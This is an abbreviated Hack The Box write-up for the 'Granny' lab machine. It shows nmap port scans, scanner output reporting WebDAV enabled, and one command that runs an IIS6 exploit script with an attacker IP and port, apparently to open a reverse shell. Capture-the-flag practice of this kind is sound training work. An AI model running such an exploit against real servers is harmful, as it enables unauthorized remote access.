...
```bash
sudo nmap -sS -p- --open --min-rate 5000 -Pn -n -vvv 10.10.10.15 -oN AllPorts
```

```bash
nmap -p 22,25,80,110,111,143,443,993,995,3306,4190,4445 -sCV -P -n 10.10.10.15 -oN FullScan
```
...
+ WebDAV enabled (PROPFIND PROPPATCH LOCK SEARCH UNLOCK MKCOL COPY listed as allowed)
...
+ End Time:           2022-09-30 22:17:37 (GMT-4) (1440 seconds)
```
...
```bash
python2.7 iis6-exploit.py 10.10.10.15 80 10.10.16.3 443
```
...
[Owned Granny from Hack The Box!](https://www.hackthebox.com/achievement/machine/906667/14)